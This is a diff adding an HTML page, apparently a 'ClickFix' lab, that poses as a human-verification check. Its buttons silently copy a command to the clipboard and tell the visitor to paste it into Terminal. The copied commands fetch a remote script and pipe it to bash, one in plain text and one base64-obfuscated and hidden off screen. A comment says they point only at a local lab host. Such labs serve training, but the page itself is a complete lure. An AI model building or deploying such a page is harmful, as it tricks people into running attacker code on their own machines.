@@ -1,0 +1,25 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Security check</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font:16px system-ui;background:#f2f4f7;color:#1d2939;display:grid;place-items:center;min-height:100vh;margin:0}
+.box{background:#fff;padding:32px 40px;border-radius:12px;box-shadow:0 2px 14px #0002;max-width:460px}
+button{padding:10px 18px;font:inherit;border:0;border-radius:6px;background:#0b6bcb;color:#fff;margin-right:8px}
+ol{padding-left:20px}textarea{position:absolute;left:-9999px}</style></head>
+<body><div class="box">
+<!-- Lab: "ClickFix". The buttons put a command on the clipboard and the page tells you to run it in Terminal.
+     The command points at this lab only and is never run by anything. -->
+<h2>Verify you are human</h2>
+<p>Unusual traffic was detected from your network. To continue, complete the verification:</p>
+<ol><li>Click <b>Verify</b> below.</li><li>Press <b>Command + Space</b>, type <b>Terminal</b> and press Return.</li>
+<li>Press <b>Command + V</b> and press Return.</li></ol>
+<button id="verify">Verify</button><button id="verify2">Verify (alternate)</button>
+<textarea id="cmd">echo Y3VybCAtcyBodHRwOi8vY2xpY2tmaXgubG9jYWxob3N0Ojg3NjUvcC5zaA== | base64 -D | bash</textarea>
+<p id="done" style="display:none;color:#067647">Verification code copied. Now paste it into Terminal.</p>
+</div><script>
+document.getElementById("verify").onclick = () => navigator.clipboard.writeText(
+  "curl -fsSL http://clickfix.localhost:8765/verify.sh | bash  # Human verification ID 48213").then(() =>
+  document.getElementById("done").style.display = "block");
+document.getElementById("verify2").onclick = () => {
+  const t = document.getElementById("cmd"); t.select(); document.execCommand("copy");
+  document.getElementById("done").style.display = "block";
+};
+</script></body></html>
